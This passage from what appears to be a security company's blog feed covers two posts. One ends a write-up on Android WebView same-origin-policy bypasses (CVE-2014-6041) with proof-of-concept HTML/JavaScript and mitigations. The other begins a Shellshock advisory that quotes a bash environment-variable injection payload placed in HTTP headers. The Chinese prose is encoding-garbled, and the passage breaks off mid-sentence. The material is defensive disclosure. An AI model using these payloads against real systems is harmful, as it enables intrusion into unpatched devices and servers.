&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;CVE-2014-6041 UXSS DEMO&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;iframe&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;target_frame&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://devco.re/&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;button&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;go&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;onclick=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;window.open(&apos;\u0000javascript:alert(document.domain)&apos;,
&apos;target_frame&apos;)&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Â¶ÇÊûú‰∏äÈù¢ÁöÑÁ∂≤È†ÅÊòØÊîæÁΩÆÂú®Ëàá &lt;a href=&quot;http://devco.re/&quot;&gt;http://devco.re/&lt;/a&gt; ‰∏çÂêåÊ∫êÁöÑÂú∞ÊñπÔºåÊ≠£Â∏∏‰æÜË™™ÈªûÊìäÊåâÈàïÂæåÊúÉÂõ†ÁÇ∫ SOP ÁöÑÈóú‰øÇÔºåË©≤ÊÆµ JavaScript ÁÑ°Ê≥ïÂü∑Ë°åËÄå‰∏çÊúÉÊúâÂèçÊáâ„ÄÇ‰ΩÜÂú®ÂèóÂΩ±ÈüøÁöÑÁí∞Â¢ÉË£°ÂâáËÉΩÈ†ÜÂà©Âü∑Ë°å‰∏¶Ë∑≥Âá∫ ‚Äúdevco.re‚Äù ÈÄôÂÄãÁ∂≤ÂüüÂêçÁ®±„ÄÇ&lt;/p&gt;

&lt;p&gt;‰∏äËø∞ÂïèÈ°åË¢´ÁôºÁèæÂæåÊ≤íÂ§ö‰πÖÔºåÂÜçÁî±Áõ∏ÂêåÁ†îÁ©∂Âì°ÁôºÁèæ‰∏ÄÂÄãÊó©Âú®Â§öÂπ¥ÂâçÂ∑≤Á∂ìË¢´‰øÆÊ≠£ÁöÑ &lt;a href=&quot;http://trac.webkit.org/changeset/96826&quot;&gt;WebKit Ëá≠Ëü≤&lt;/a&gt;‰ªçÁÑ∂Âá∫ÁèæÂú® Android 4.3 Âèä‰πãÂâçÁöÑÁâàÊú¨‰∏ä„ÄÇ&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;http://www.bing.com&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;appendChild&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;javascript:alert(document.domain)&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;innerHTML&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;foobar&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;‰∏äËø∞ÁöÑË∑®‰æÜÊ∫êÊìç‰ΩúÂêåÊ®£ÈÅïÂèç‰∫Ü SOPÔºåÊáâÁï∂Ë¢´ÊãíÁµïÂü∑Ë°å„ÄÇ‰ΩÜ‰ªñÂçªËÉΩÂú®ÊúâÈ¢®Èö™ÁöÑ WebView ‰∏äË¢´Âü∑Ë°åÔºåÈÄ†ÊàêÈ¢®Èö™„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;Èò≤ÁØÑ-1&quot;&gt;Èò≤ÁØÑ&lt;/h4&gt;

&lt;p&gt;‰ΩúÁÇ∫ÈñãÁôºËÄÖ&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Â¶ÇÈùûÈúÄË¶ÅÔºåÈóúÈñâ JavaScript ÂäüËÉΩ (È†êË®≠ÈóúÈñâ)&lt;/li&gt;
  &lt;li&gt;ÂèØËÄÉÊÖÆÊääÁ∂≤È†ÅÁï∂‰ΩúÁØÑÊú¨ÂÑ≤Â≠òÂú®ÊáâÁî®ÂÖßÔºåÂÜçÁî®ÂÖ∂‰ªñÈÄîÂæëËºâÂÖ•Ë≥áÊñô&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;‰ΩúÁÇ∫‰ΩøÁî®ËÄÖ&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Â¶ÇÈùûÈúÄË¶ÅÔºåÈóúÈñâ [‰∏çÊòéÁöÑ‰æÜÊ∫ê] ÈÅ∏È†Ö (È†êË®≠ÈóúÈñâ)&lt;/li&gt;
  &lt;li&gt;‰ΩøÁî® Android 4.4 Êàñ‰ª•‰∏ä‰∏çÂèóÂΩ±ÈüøÁöÑÁ≥ªÁµ±&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ÁµêË™û&quot;&gt;ÁµêË™û&lt;/h3&gt;

&lt;p&gt;Ë´áÂà∞ÈÄôË£°Â§ßÂÆ∂ÂèØËÉΩÊúÉÊúâÂÄãÁñëÂïèÔºåÂ¶ÇÊûúÊáâÁî®Á®ãÂºè‰∏≠ÊâÄËºâÂÖ•ÁöÑÈÅ†Á´ØÁ∂≤È†ÅÁ∂≤ÂùÄÈÉΩÊòØÂõ∫ÂÆöÔºåÂèóÈñãÁôºËÄÖÊéßÂà∂ÁöÑÔºåÊáâË©≤Â∞±ÊúÉÂÆâÂÖ®Ê≤íÊúâÈ¢®Èö™„ÄÇÈÇÑË®òÂæóÂú® &lt;a href=&quot;http://devco.re/blog/2014/08/15/ssl-mishandling-on-mobile-app-development/&quot;&gt;Ë¢´ÂøΩÁï•ÁöÑ SSL ËôïÁêÜ&lt;/a&gt; Ë£°ÊèêÂèäÈÅéÁöÑ‰∏≠Èñì‰∫∫ÊîªÊìäÂóéÔºüÂ¶ÇÊûúÈÄ£Á∑öÈÅéÁ®ãÊòØÊé°Áî®ÊòéÊñáÁöÑ HTTP ÔºåÊàñÊòØÂä†ÂØÜÁöÑ HTTPS ‰ΩÜÊ≤íËêΩÂØ¶ÂÅöÂ•ΩÊÜëË≠âÊ™¢Êü•ÔºåÂÖßÂÆπÂ∞±ÊúâÊ©üÊúÉË¢´ÊîªÊìäËÄÖÁ´äÂèñ‰øÆÊîπÔºåÂÜçÁµêÂêà‰∏äÈù¢ÊèêÂà∞ÁöÑÊºèÊ¥ûÔºåÂ∞ç‰ΩøÁî®ËÄÖÂ∏∂‰æÜÁöÑÂΩ±ÈüøÂâáÂ§ßÂ§ßÂ¢ûÂä†„ÄÇ&lt;/p&gt;

&lt;p&gt;‰∏ãÈù¢ÊàëÂÄëË£Ω‰Ωú‰∫Ü‰∏ÄÊÆµÁµêÂêà‰∏≠Èñì‰∫∫ÊîªÊìäËàá addJavascriptInterface ÊºèÊ¥ûÔºåÊ®°Êì¨‰ΩøÁî®ËÄÖÊâãÊ©üË¢´ÂÖ•‰æµÁöÑÂΩ±ÁâáÔºö&lt;/p&gt;

&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;https://www.youtube.com/embed/reKEu-Ajo50&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;

&lt;p&gt;ÂæûÂΩ±ÁâáÁöÑÊúÄÂæåÂèØ‰ª•ÁúãÂà∞ÔºåÊîªÊìäËÄÖÂèñÂæóÂ≠òÂú®ÊºèÊ¥ûÁöÑÊáâÁî®Á®ãÂºèÊ¨äÈôêÔºå‰∏¶ÂèñÂæóË£°Èù¢ÁöÑÊ©üÊïèË≥áÊñô„ÄÇ&lt;/p&gt;

&lt;p&gt;ËÄåÂú®ÁπûÈÅéÂêåÊ∫êÁ≠ñÁï•ÂïèÈ°å‰∏äÔºåÁÑ°Ë´ñÊòØÈÄèÈÅé null byte ÊàñÊòØË®≠ÂÆöÂ±¨ÊÄß‰æÜÈÅîÂà∞ÔºåÂÖ∂ÂØ¶ÈÉΩÊòØÂ±¨ÊñºÂ≠òÂú®Â∑≤‰πÖÁöÑÊâãÊ≥ïÔºåÂ§öÂπ¥ÂâçÂú®Âà•ÁöÑÂπ≥Âè∞„ÄÅÁÄèË¶ΩÂô®‰∏äÂ∞±Â∑≤Á∂ìÁôºÁîüÈÅéÔºåÈô§‰∫ÜÁ∑®ÂØ´‰∏äÁöÑÁñèÂøΩÂ§ñÔºåÁº∫‰πè‰∏ÄÂÄãÂÆåÊï¥ÁöÑÊ∏¨Ë©¶ÊµÅÁ®ãÂéªÂÅöÊ™¢Êü•Áõ∏‰ø°‰πüÊòØÂÖ∂‰∏≠‰∏ÄÂÄãÂéüÂõ†„ÄÇ&lt;/p&gt;

&lt;p&gt;Android ÁöÑÁîüÊÖãÁ≥ªÁµ±ÂïèÈ°åÔºå‰ΩøÂæóÂ§ßÂ§öÊï∏ÁöÑ‰ΩøÁî®ËÄÖÊâãÊ©üÊú™ËÉΩË∑üÂæó‰∏äÁ≥ªÁµ±Êõ¥Êñ∞ÁöÑÊ≠•È©üÔºåËÆì‰ªñÂÄëÂç≥‰ΩøÁü•ÈÅìËá™Â∑±ÊâÄ‰ΩøÁî®Á≥ªÁµ±Â≠òÂú®ÂïèÈ°å‰πüÊÑõËé´ËÉΩÂä©„ÄÇ&lt;/p&gt;

&lt;p&gt;‰ΩúÁÇ∫ÈñãÁôºÂïÜÔºåÊáâÈúÄË¶ÅÂú®Á≥ªÁµ±ÊîØÊè¥Â∫¶ËàáÂÖ∂Áõ∏ÊáâÂ≠òÂú®ÁöÑÂÆâÂÖ®È¢®Èö™‰∏≠ÂèñÂæóÂπ≥Ë°°Ôºå‰æÜÊ±∫ÂÆöÊáâÁî®Á®ãÂºèÊâÄÊîØÊè¥ÁöÑÊúÄ‰ΩéÁâàÊú¨ÁÇ∫‰Ωï„ÄÇÊúÄÂæå‰ΩúÁÇ∫‰∏ÄÂÄãË≤†Ë≤¨‰ªªÁöÑÈñãÁôºËÄÖÔºåÊáâÁÇ∫Â∑≤Ë¢´ÂÖ¨ÈñãÁöÑÊºèÊ¥ûÂÅöÂ•ΩÊáâÂ∞çÊé™ÊñΩÔºåÈÅøÂÖç‰ΩøÁî®ËÄÖÊö¥Èú≤Âú®È¢®Èö™Áï∂‰∏≠„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;ÂèÉËÄÉ&quot;&gt;ÂèÉËÄÉ&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://50.56.33.56/blog/?p=314&quot;&gt;Abusing WebView JavaScript Bridges&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.rafayhackingarticles.net/2014/08/android-browser-same-origin-policy.html&quot;&gt;Android Browser Same Origin Policy Bypass &amp;lt; 4.4 - CVE-2014-6041&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.rafayhackingarticles.net/2014/10/a-tale-of-another-sop-bypass-in-android.html&quot;&gt;A Tale Of Another SOP Bypass In Android Browser &amp;lt; 4.4&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2014/10/13/android-webview-left-shortcuts-for-hacker/</link>
                <guid>https://devco.re/blog/2014/10/13/android-webview-left-shortcuts-for-hacker</guid>
                <pubDate>Mon, 13 Oct 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Shellshock (Bash CVE-2014-6271) Â®ÅËÑÖ‰ªçÂú®Êì¥Â§ß‰∏≠Ôºå‰ΩÜÁÑ°ÈúÄÈÅéÂ∫¶ÊÅêÊÖå</title>
                <description>&lt;p&gt;Ëá™ 9/24 ‰ª•‰æÜÔºå‰∏çÂ∞ëË≥áË®äÂúàÊúãÂèãÊó•‰ª•ÁπºÂ§úÁöÑÂøôÁ¢åÔºåÈÄôÈÉΩÂ§öËôß‰∫ÜËóèÂú® Bash Ë£° 22 Âπ¥ÁöÑÂÆâÂÖ®ÊºèÊ¥ûÔºç&lt;a href=&quot;https://en.wikipedia.org/wiki/Shellshock_%28software_bug%29&quot;&gt;Shellshock&lt;/a&gt; (Bash CVE-2014-6271)„ÄÇÂ∞çÊñºÊÉ°ÊÑèÊîªÊìäËÄÖËÄåË®ÄÔºåÈÄôÊòØ‰ªäÂπ¥‰æÜÁ¨¨‰∫åÊ≥¢Ê∑òÈáëÊΩÆÔºåÁõ∏ËºÉÊñº‰∏äÊ¨° &lt;a href=&quot;https://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/&quot;&gt;Heartbleed&lt;/a&gt; Èß≠ÂÆ¢ÂÄëÁöÑÂàÆÂàÆÊ®ÇÈÅäÊà≤ÈúÄË¶ÅÊãºÈÅãÊ∞£ÔºåÈÄôÊ¨°ÁöÑ Shellshock Âè™Ë¶Å‰∏ÄÁôºÁèæÂà©Áî®ÈªûÔºåÂ∞±ËÉΩÈ¶¨‰∏äÊìÅÊúâÂü∫Êú¨ÁöÑÁ≥ªÁµ±Êìç‰ΩúÊ¨äÈôêÔºå‰πüÈõ£ÊÄ™ &lt;a href=&quot;http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6271&quot;&gt;NVD&lt;/a&gt; Áµ¶‰∫à Shellshock ÊúÄÂö¥ÈáçÁöÑ 10.0 ÂàÜÂΩ±ÈüøÁ≠âÁ¥ö„ÄÇ&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;Shellshock ÂèóÂΩ±ÈüøÁöÑ Bash ÁâàÊú¨Â¶Ç‰∏ãÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Bash 4.3 Patch 25 ÔºàÂê´Ôºâ‰ª•ÂâçÁâàÊú¨&lt;/li&gt;
  &lt;li&gt;Bash 4.2 Patch 48 ÔºàÂê´Ôºâ‰ª•ÂâçÁâàÊú¨&lt;/li&gt;
  &lt;li&gt;Bash 4.1 Patch 12 ÔºàÂê´Ôºâ‰ª•ÂâçÁâàÊú¨&lt;/li&gt;
  &lt;li&gt;Bash 4.0 Patch 39 ÔºàÂê´Ôºâ‰ª•ÂâçÁâàÊú¨&lt;/li&gt;
  &lt;li&gt;Bash 3.2 Patch 52 ÔºàÂê´Ôºâ‰ª•ÂâçÁâàÊú¨&lt;/li&gt;
  &lt;li&gt;Bash 3.1 Patch 18 ÔºàÂê´Ôºâ‰ª•ÂâçÁâàÊú¨&lt;/li&gt;
  &lt;li&gt;Bash 3.0 Patch 17 ÔºàÂê´Ôºâ‰ª•ÂâçÁâàÊú¨&lt;/li&gt;
  &lt;li&gt;Bash 2.0.5b Patch 8 ÔºàÂê´Ôºâ‰ª•ÂâçÁâàÊú¨&lt;/li&gt;
  &lt;li&gt;Bash 1.14.7 ÔºàÂê´Ôºâ‰ª•ÂâçÁâàÊú¨&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ÈÄôÊ¨°ÁöÑÂïèÈ°åÂá∫Âú® bash Â∞çÁí∞Â¢ÉËÆäÊï∏ÁöÑËß£Êûê‰∏ä„ÄÇËã•ÊúâËæ¶Ê≥ïÂú®Áí∞Â¢ÉËÆäÊï∏‰∏≠Â°ûÂÖ•ÊÉ°ÊÑèÁöÑÁ®ãÂºèÁ¢ºÔºå‰∏¶‰∏îÈ†ÜÂà©Â∞áÈÄô‰∫õÁí∞Â¢ÉËÆäÊï∏ÂÇ≥ÂÖ• bashÔºåbash Â∞±ÊúÉÂõ†Ëß£ÊûêÈåØË™§ËÄåÂü∑Ë°åÊÉ°ÊÑèÊåá‰ª§„ÄÅÂíåËÆìÊîªÊìäËÄÖËÉΩÁõ¥Êé•Â∞çÁ≥ªÁµ±ÈÄ≤Ë°åÂü∫Êú¨ÁöÑÊìç‰Ωú„ÄÇÂéüÂßãÁ¢ºÂèäÊõ¥ÈÄ≤ÈöéÁöÑÂéüÁêÜË´ãÂèÉËÄÉ&lt;a href=&quot;http://blog.erratasec.com/2014/09/the-shockingly-bad-code-of-bash.html&quot;&gt;ÈÄôÁØá&lt;/a&gt;„ÄÇShellshock ‰πãÊâÄ‰ª•Âö¥ÈáçÔºå‰∏Ä‰æÜÊòØÂõ†ÁÇ∫ÊîªÊìäË™ûÊ≥ïÁõ∏Áï∂Á∞°ÂñÆÔºåÂè™ÈúÄË¶Å‰∏ÄË°åÊåá‰ª§ÔºåÂ∞±ÂèØ‰ª•Áõ¥Êé•Â∞çÁ≥ªÁµ±ÈÄ≤Ë°åÊìç‰ΩúÔºõ‰∫å‰æÜÊòØÂõ†ÁÇ∫ bash ‰ΩøÁî®ÁØÑÂúçÊ•µÂª£ÔºåÂ§öÊ¨æ‰ΩúÊ•≠Á≥ªÁµ±È†êË®≠ shell Â∞±ÊòØ bash„ÄÇ Â∏∏Ë¶ãÁöÑ‰ΩúÊ•≠Á≥ªÁµ±ËàáÂÖ∂È†êË®≠ shell Êï¥ÁêÜÂ¶Ç‰∏ãÔºö&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;‰ΩúÊ•≠Á≥ªÁµ±&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;È†êË®≠ shell&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;CentOS&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;bash&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Fedora&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;bash&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;RHEL&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;bash&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Mac OS X&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;bash&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Android&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Êó©ÊúüÊòØ ash, 3.0 ÈñãÂßãÊòØ mksh&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Debian&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;sh (Lenny, 5.0)&lt;br /&gt;dash (Squeeze, 6.0)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;embedded device&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Â§ßÈÉ®ÂàÜ‰ΩøÁî® busybox (ash)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;FreeBSD&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;tcsh&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Ubuntu&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;dash&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;iOS&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Jailbreak ÂæåÊòØ bash&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;br /&gt;
ÊàëÂÄëÁúãÂà∞ËøëÂçäÊï∏Áü•ÂêçÁöÑ un*x Á≥ªÁµ±È†êË®≠‰ΩøÁî® bashÔºåÂèØ‰ª•Êé®ÊÉ≥ÈÄôÊ¨°ÂΩ±ÈüøÁØÑÂúçÊúâÂ§öÂª£ÔºåÂ∞§ÂÖ∂ÊòØË®±Â§öÊúçÂãôÈÉΩÊû∂ÊßãÂú®ÈÄô‰πã‰∏äÔºåËã•ÈÅ≠ÂèóÂà∞ÊîªÊìäÔºåÊêçÂ§±ÁöÑÂèØËÉΩÊòØ‰ºÅÊ•≠ÁöÑÊ©üÂØÜË≥áÊñôÊàñÂÆ¢Êà∂Ë≥áÊñô„ÄÇËá≥ÊñºÊ≤íÊúâÈ†êË®≠‰ΩøÁî® bash ÁöÑ‰ΩúÊ•≠Á≥ªÁµ±Ôºå‰πü‰∏¶‰∏çÊÑèÂë≥ËëóÂÆåÂÖ®Ê≤íÊúâÈ¢®Èö™Ôºå‰æãÂ¶Ç Ubuntu Âú® DHCP ÂÆ¢Êà∂Á´Ø‰ΩøÁî®Âà∞ bash ÔºåÂ∞±‰ªçÁÑ∂ÊúÉÊúâÈ¢®Èö™Ôºå‰∏ãÈù¢ÊñáÁ´†‰∏≠‰πüÊúÉÊèêÂà∞ÈÄôÊ®£ÁöÑÁãÄÊ≥Å„ÄÇÂè¶Â§ñÔºåÊó©ÊúüÊñ∞ËÅû‰∏≠Â∏∏Âá∫ÁèæÁâ©ËÅØÁ∂≤Ë®≠ÂÇôÊúÉÂèóÊ≠§ÊºèÊ¥ûÂΩ±ÈüøÁöÑÂ†±Â∞éÔºåÁ∂ìÈÅéÊàëÂÄëÂØ¶Ê∏¨ÔºåÁâ©ËÅØÁ∂≤Ë®≠ÂÇôÁÇ∫Ê±ÇÁ≤æÁ∞°ÔºåÂ§ßÂ§ö‰ΩøÁî® busyboxÔºåËÄåÂÖ∂ shell ÁÇ∫ ashÔºåÊïÖÂ§ßÂ§öÊï∏Ë®≠ÂÇôÂú®ÈÄôÊ¨° Shellshock Â®ÅËÑÖ‰∏≠ÂΩ±Èüø‰∏çÂ§ßÔºå‰∏çÈÅéÂÑòÁÆ°Áâ©ËÅØÁ∂≤Ë®≠ÂÇôÈÄÉÈÅé‰∫ÜÈÄôÊ¨° Shellshock ‰∫ã‰ª∂ÔºåÊúâË®±Â§öË®≠ÂÇô‰ªçÁÑ∂ÊòØ&lt;a href=&quot;http://devco.re/blog/2014/09/24/security-of-ip-camera-and-nvr/&quot;&gt;Ëµ§Ë£∏Ë£∏&lt;/a&gt;ÁöÑ„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;Â∏∏Ë¶ãÁöÑ-shellshock-Âà©Áî®ÊñπÂºè&quot;&gt;Â∏∏Ë¶ãÁöÑ Shellshock Âà©Áî®ÊñπÂºè&lt;/h3&gt;

&lt;p&gt;Shellshock ÊºèÊ¥ûË¢´ÂÖ¨Â∏ÉÂæåÔºåÊÉ°ÊÑèÊîªÊìäËÄÖÁÑ°‰∏çÊÉ≥Ë¶ÅÈÄèÈÅéÈÄôÂÄãÊºèÊ¥ûÂ∞ç‰º∫ÊúçÂô®ÈÄ≤Ë°åÈÅ†Á´ØÊîªÊìäÔºå‰∏Ä‰∫õÈÅ†Á´ØÊîªÊìäÊ¶ÇÂøµ‰πüÈô∏Á∫åË¢´Ë≠âÂØ¶„ÄÇÊúÄÊó©ÁöÑ&lt;a href=&quot;http://blog.erratasec.com/2014/09/bash-shellshock-scan-of-internet.html&quot;&gt;ÂÖ¨ÈñãÂ§ßÈáèÊéÉÊèè&lt;/a&gt;ÊòØÁî± Errata Security Âú®ÂÖ∂ÈÉ®ËêΩÊ†ºÂÖ¨Â∏ÉÊäÄË°ìÁ¥∞ÁØÄÔºå‰ªñÂÄëÂú® HTTP Ë´ãÊ±ÇË°®È†≠‰∏≠ÁöÑ Cookie„ÄÅHost„ÄÅReferer ‰∏≠ÊîæÁΩÆÊÉ°ÊÑèË™ûÊ≥ï &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;() { :; }; ping -c 3 209.126.230.74&lt;/code&gt;Ôºå‰∏¶‰∏îÂà©Áî® masscan 